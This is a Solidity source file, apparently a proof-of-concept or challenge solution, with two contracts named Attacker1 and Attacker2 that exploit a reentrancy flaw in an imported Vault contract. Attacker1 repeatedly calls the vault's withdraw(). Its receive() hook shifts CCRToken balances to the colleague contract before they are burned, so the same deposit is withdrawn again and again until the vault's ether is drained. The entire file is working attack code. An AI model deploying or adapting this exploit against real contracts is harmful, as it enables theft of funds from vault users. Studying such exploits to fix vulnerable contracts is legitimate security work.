// SPDX-License-Identifier: MIT
pragma solidity 0.8.20;
import "./vault.sol";


contract Attacker1 {
    Vault victim;
    CCRToken ccrt;
    Attacker2 attacker2;
    uint256 amount = 1 ether;

    /**
     * @param _victim victim address
     * @param _ccrt  victim token ERC20 address
     */ 
    constructor(address _victim, address _ccrt) payable {
        victim = Vault(_victim);
        ccrt = CCRToken(_ccrt);  
    }


    /**
     * @notice Set attacker2 contract
     * @param _attacker2  attacker colleague address
     */
    function setattacker2(address _attacker2) public {
        attacker2 = Attacker2(_attacker2);
    }

    /**
     * @notice Receive ether. same amout of withdraw() but we can transfer same amount to attacker2. 
     * Because burn balance of attacker1 after this function.
     * @dev triggered by victim.withdraw()
     */
    receive() external payable {
        ccrt.transfer(address(attacker2), msg.value); 
    }

    /**
     * @notice deposit and we can repeatly withdraw.
     */
    function attack() public {
        uint256 value = address(this).balance;
        victim.deposit{value: value}();
        while(address(victim).balance >= amount){
            victim.withdraw();
            attacker2.send(address(this), value); //send ERC20 token that multiplied at recieve().
        }    
    }
}


contract Attacker2 {
    Vault victim;
    CCRToken ccrt;
    uint256 amount = 1 ether;

    constructor(address _victim, address _ccrt) {
        victim = Vault(_victim);
        ccrt = CCRToken(_ccrt);
    }

    /**
     * @notice Just send ERC20 to the attacker
     */
    function send(address _target, uint256 _amount) public {
        ccrt.transfer(_target, _amount);
    }
}


